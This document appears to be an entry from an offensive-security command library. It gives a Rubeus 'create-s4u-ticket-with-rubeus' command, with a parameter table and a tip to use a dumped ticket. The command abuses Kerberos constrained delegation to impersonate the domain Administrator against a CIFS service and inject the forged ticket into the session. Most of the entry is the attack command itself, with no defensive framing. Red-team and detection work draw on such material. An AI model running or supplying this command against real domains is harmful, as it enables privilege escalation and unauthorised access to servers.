---
id: 9b66e4aa-df36-4354-aca6-918d0197d618
name: create-s4u-ticket-with-rubeus
type: command
executor: powershell
data: >-
  Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local
  /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt
output: null
created_at: '2023-04-06T03:56:07.695673+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - s4u
verified: true
validated: true
---

# create-s4u-ticket-with-rubeus

## Command

```powershell
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt
```

## Description

Creates an S4U ticket using a provided existing ticket for impersonation and injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /impersonateuser | User to impersonate | Yes |
| /msdsspn | Target SPN | Yes |
| /ticket | Base64 ticket input | Yes |
| /ptt | Inject into session | Yes |

## Examples

### Basic Usage

Use dumped ticket as /ticket value.

## Expected Output

Ticket created and injected successfully.

## Related

- [[procedures/kerberos-constrained-delegation-exploitation]]
- [[tools/Rubeus]]
